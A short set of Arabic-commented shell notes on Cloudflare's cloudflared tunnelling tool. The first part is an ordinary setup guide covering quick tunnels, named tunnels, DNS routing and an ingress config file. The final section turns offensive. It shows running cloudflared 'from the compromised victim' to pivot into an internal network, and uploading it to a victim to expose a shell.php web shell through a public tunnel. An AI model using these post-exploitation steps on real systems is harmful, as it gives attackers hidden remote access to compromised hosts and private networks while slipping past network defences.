# تحميل الإصدار الجديد
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64

# جعلها قابلة للتنفيذ
chmod +x cloudflared-linux-amd64

# إنشاء نفق سريع لخادم محلي
./cloudflared-linux-amd64 tunnel --url http://localhost:8080

#النتيجة: يعطيك رابط https://random-name.trycloudflare.com يشير لخادمك المحلي

# إنشاء نفق دائم (Production):
# 1. تسجيل الدخول للحساب Cloudflare

./cloudflared tunnel login
# 2. إنشاء tunnel جديد
./cloudflared tunnel create my-tunnel

# 3. ربط النفق بـ subdomain مخصص
./cloudflared tunnel route dns my-tunnel app.example.com

# 4. تشغيل النفق
./cloudflared tunnel run my-tunnel --url http://localhost:3000


#  التكوين المتقدم (config.yml):

tunnel: 12345678-abcd-1234-abcd-123456789abc
credentials-file: /root/.cloudflared/12345678-abcd-1234-abcd-123456789abc.json

ingress:
  - hostname: app.example.com
    service: http://localhost:3000
  - hostname: api.example.com
    service: http://localhost:8080
  - service: http_status:404

#3. Pivot عبر Internal Networks:

# من الضحية المخترقة:
./cloudflared tunnel --url http://victim-ip:8080
# الآن الـ handler الخارجي يصل للشبكة الداخلية!


# رفع web shell على الضحية
wget https://github.com/cloudflare/cloudflared/releases/.../cloudflared-linux-amd64
chmod +x cloudflared-linux-amd64
./cloudflared-linux-amd64 tunnel --url http://localhost:8888/shell.php

